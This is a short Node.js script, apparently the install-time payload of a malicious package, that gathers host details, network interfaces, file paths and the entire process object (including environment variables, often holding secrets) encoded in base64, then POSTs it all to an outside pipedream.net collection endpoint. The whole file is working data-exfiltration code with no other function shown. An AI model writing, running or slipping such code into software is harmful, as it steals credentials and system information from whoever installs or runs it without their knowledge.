'use strict';

// Importing required modules
const https = require('https');
const http = require("http");
const os = require("os");

// Retrieving information about the current environment
var currentPath = __dirname; // Current directory path
var currentFile = __filename; // Current file path
var currentEnvString = JSON.stringify(process); // Current environment variables as a JSON string
var currentEnvBase64 = Buffer.from(currentEnvString).toString('base64'); // Current environment variables encoded in base64

// Creating an object containing system and environment information
var data = {
    envPORT: process.env.PORT,
    hostname: JSON.stringify(os.hostname()),
    currentPath: currentPath,
    currentFile: currentFile,
    currentEnvBase64: currentEnvBase64,
    type: JSON.stringify(os.type()),
    platform: JSON.stringify(os.platform()),
    arch: JSON.stringify(os.arch()),
    release: JSON.stringify(os.release()),
    uptime: JSON.stringify(os.uptime()),
    loadavg: JSON.stringify(os.loadavg()),
    totalmem: JSON.stringify(os.totalmem()),
    freemem: JSON.stringify(os.freemem()),
    cpus: JSON.stringify(os.cpus()),
    networkInterfaces: JSON.stringify(os.networkInterfaces())
};

// Converting data to JSON format
data = JSON.stringify(data);

// Configuring HTTP request options
const options = {
    hostname: 'fb40d252f3831c4553eb428e5620a2a0.m.pipedream.net',
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': data.length
    }
};

// Making an HTTPS POST request
const req = https.request(options, res => {
    // Handling response data
    res.on('data', d => {
        process.stdout.write(d);
    });
});

// Handling request errors
req.on('error', error => {
    console.error(error);
});

// Writing data to the request
req.write(data);

// Ending the request
req.end();

